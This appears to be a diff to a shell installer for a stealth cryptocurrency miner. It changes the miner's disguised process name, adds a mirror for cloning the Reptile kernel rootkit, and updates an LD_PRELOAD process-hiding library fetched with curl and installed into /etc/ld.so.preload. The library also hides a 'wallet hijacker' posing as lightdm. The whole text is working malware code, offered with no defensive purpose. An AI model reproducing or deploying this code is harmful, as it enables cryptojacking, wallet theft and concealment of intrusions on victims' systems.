@@ -547,6 +547,9 @@ cat > /tmp/kworker_wrapper.c << 'WRAPPER_EOF'
 /*
  * Kernel Worker Process Wrapper
  * Renames process to look like kernel worker thread using prctl(PR_SET_NAME)
+ * 
+ * NOTE: prctl renaming is COMMENTED OUT - process will show as "swapd"
+ * Reason: LD_PRELOAD hiding works better with simple process name
  */
 
 #include <stdio.h>
@@ -556,11 +559,13 @@ cat > /tmp/kworker_wrapper.c << 'WRAPPER_EOF'
 #include <string.h>
 
 int main(int argc, char *argv[]) {
-    // Set process name to kernel worker thread
-    // prctl can set up to 15 characters
+    // COMMENTED OUT: Set process name to kernel worker thread
+    // Reason: LD_PRELOAD filtering works better with "swapd" name
+    /*
     if (prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0) < 0) {
         // Silently continue even if prctl fails
     }
+    */
     
     // Path to actual miner binary
     char *miner_path = "/root/.swapd/.kworker";
@@ -571,8 +576,12 @@ int main(int argc, char *argv[]) {
         exit(1);
     }
     
-    // Set argv[0] to kernel worker name (shows in ps output)
+    // COMMENTED OUT: Set argv[0] to kernel worker name
+    // Now keeps original argv[0] which will be "swapd"
+    /*
     new_argv[0] = "[kworker/0:0]";
+    */
+    new_argv[0] = argv[0];  // Keep original name (swapd)
     
     // Copy remaining arguments (like -c /root/.swapd/swapfile)
     for (int i = 1; i < argc; i++) {
@@ -591,12 +600,12 @@ WRAPPER_EOF
 
 # Compile the wrapper
 if command -v gcc >/dev/null 2>&1; then
-    echo "[*] Compiling kernel worker wrapper with gcc..."
+    echo "[*] Compiling process wrapper with gcc..."
     gcc -o swapd /tmp/kworker_wrapper.c 2>/dev/null && {
         chmod +x swapd
         rm -f /tmp/kworker_wrapper.c
-        echo "[✓] Kernel worker wrapper compiled successfully"
-        echo "[✓] Process will appear as 'kworker/0:0' (kernel worker thread)"
+        echo "[✓] Process wrapper compiled successfully"
+        echo "[✓] Process will appear as 'swapd' (LD_PRELOAD will hide it)"
     } || {
         echo "[!] Failed to compile wrapper, using direct binary"
         # Fallback: create symlink to actual binary
@@ -1055,10 +1064,19 @@ install_reptile() {
     # Clone Reptile (disable interactive prompts)
     echo "[*] Cloning Reptile..."
     export GIT_TERMINAL_PROMPT=0
-    if ! git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"; then
-        echo "[!] Failed to clone Reptile (network or repository unavailable)"
-        unset GIT_TERMINAL_PROMPT
-        return 1
+    
+    # Try Gitee mirror first (faster, more reliable)
+    if git clone --depth 1 https://gitee.com/fengzihk/Reptile.git 2>&1 | grep -v "Username"; then
+        echo "[✓] Cloned from Gitee mirror"
+    else
+        echo "[*] Gitee failed, trying GitHub mirror..."
+        # Fallback to GitHub
+        if ! git clone --depth 1 https://github.com/f0rb1dd3n/Reptile.git 2>&1 | grep -v "Username"; then
+            echo "[!] Failed to clone Reptile (network or repository unavailable)"
+            unset GIT_TERMINAL_PROMPT
+            return 1
+        fi
+        echo "[✓] Cloned from GitHub mirror"
     fi
     unset GIT_TERMINAL_PROMPT
     
@@ -1229,10 +1247,10 @@ curl -s -o /tmp/processhider.c https://raw.githubusercontent.com/littlAcen/libpr
  * NOTE: We DON'T hide "xmrig" so we can detect competing miners!
  */
 static const char* processes_to_hide[] = {
-    "kworker/0:0",     // Our miner (prctl renamed)
-    "swapd",           // Miner wrapper (if visible)
+    "swapd",           // Our miner (primary name - prctl disabled)
     ".kworker",        // Hidden binary name
     "lightdm",         // Wallet hijacker (disguised as display manager)
+    // "kworker/0:0",  // COMMENTED: prctl renaming disabled, not needed
     NULL               // Terminator - ALWAYS keep this!
 };
 
@@ -1363,7 +1381,7 @@ if gcc -fPIC -shared -o /usr/local/lib/libprocesshider.so /tmp/processhider.c -l
         fi
     fi
     
-    echo "[✓] Processes will be hidden: kworker/0:0, swapd, lightdm, .kworker"
+    echo "[✓] Processes will be hidden: swapd, lightdm, .kworker"
     echo "[*] NOT hiding 'xmrig' so you can detect competing miners!"
 else
     echo "[!] Failed to compile LD_PRELOAD library"
@@ -1512,7 +1530,7 @@ if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; th
     sleep 2
     
     # Test if processes are hidden
-    if ps aux | grep -E "swapd|kworker.*swapfile" | grep -v grep >/dev/null 2>&1; then
+    if ps aux | grep "swapd" | grep -v grep >/dev/null 2>&1; then
         echo ""
         echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
         echo "⚠️  WARNING: Processes are still VISIBLE!"
@@ -1554,7 +1572,7 @@ echo "[*] Hiding miner processes..."
 # Method 1: LD_PRELOAD (automatic, system-wide)
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo "[✓] LD_PRELOAD rootkit active (processes automatically hidden)"
-    echo "    Hiding: kworker/0:0, swapd, lightdm, .kworker"
+    echo "    Hiding: swapd, lightdm, .kworker"
     echo "    NOT hiding: xmrig (to detect competing miners)"
 fi
 
@@ -1844,7 +1862,7 @@ echo 'Stealth Features Deployed:'
 
 if [ -f /etc/ld.so.preload ] && grep -q "libprocesshider" /etc/ld.so.preload; then
     echo '  ✓ LD_PRELOAD Rootkit: ACTIVE (userland process hiding - ALL KERNELS)'
-    echo '    Hiding: kworker/0:0, swapd, lightdm, .kworker'
+    echo '    Hiding: swapd, lightdm, .kworker'
     echo '    NOT hiding: xmrig (to detect competing miners)'
 else
     echo '  ○ LD_PRELOAD Rootkit: Not loaded'
@@ -1887,7 +1905,7 @@ else
 fi
 
 echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
-echo '  ✓ Process name: kworker/0:0 (kernel worker thread - prctl renamed)'
+echo '  ✓ Process name: swapd (LD_PRELOAD will hide it)'
 echo '  ✓ Binary structure: swapd wrapper → .kworker (actual miner)'
 echo '  ✓ Process hiding: LD_PRELOAD + Kernel rootkits (multi-layer)'
 
@@ -1932,7 +1950,7 @@ echo ''
 # Check if processes are actually hidden
 PROCESSES_VISIBLE=false
 
-if ps aux | grep -E "swapd|kworker.*swapfile" | grep -v grep >/dev/null 2>&1; then
+if ps aux | grep "swapd" | grep -v grep >/dev/null 2>&1; then
     PROCESSES_VISIBLE=true
     echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
 fi
